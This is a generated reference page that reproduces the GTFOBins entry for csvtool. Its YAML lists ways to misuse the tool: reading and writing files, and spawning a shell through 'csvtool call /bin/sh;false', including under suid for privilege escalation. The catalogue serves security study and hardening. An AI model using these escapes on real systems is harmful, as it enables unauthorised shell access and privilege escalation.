---
parsed_by: focuslocust
source: gtfobins
type: generated
---
# csvtool

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `gtfobins` |
| Type | `tool` |
| Record ID | `csvtool` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/csvtool` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [csvtool](../../tools/linux/csvtool.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | csvtool |
| name | csvtool |
| type | tool |
| source | gtfobins |
| url | https://gtfobins.github.io/gtfobins/csvtool/ |

## Preserved Source Material

```yaml
_body: ''
_name: csvtool
_source_path: /home/adams/scorchederf/focuslocust/.cache/gtfobins/_gtfobins/csvtool
functions:
  file-read:
  - binary: false
    code: csvtool trim t /path/to/input-file
    comment: The file is actually parsed and manipulated as CSV.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  file-write:
  - binary: false
    code: 'echo DATA >/path/to/temp-file

      csvtool trim t /path/to/temp-file -o /path/to/output-file'
    comment: The file is actually parsed and manipulated as CSV.
    contexts:
      sudo: null
      suid: null
      unprivileged: null
  shell:
  - code: csvtool call '/bin/sh;false' /etc/hosts
    contexts:
      sudo: null
      suid:
        shell: true
      unprivileged: null
```
